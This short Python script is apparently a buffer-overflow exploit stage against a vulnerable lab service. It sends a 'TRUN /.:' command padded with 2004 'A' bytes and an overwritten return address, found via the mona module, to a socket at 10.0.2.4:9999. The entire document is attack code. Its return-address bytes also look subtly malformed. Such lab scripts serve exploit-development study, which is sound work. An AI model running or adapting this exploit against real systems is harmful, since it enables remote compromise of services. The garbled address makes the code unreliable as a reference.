#!/usr/bin/python
import sys, socket
from time import sleep


# 625011af find through mona module

shellcode = "A" * 2004 + "\xaf\x11\x50\62"

try:
	payload = "TRUN /.:" + shellcode
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.0.2.4', 9999))
	
	s.send(payload.encode())
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
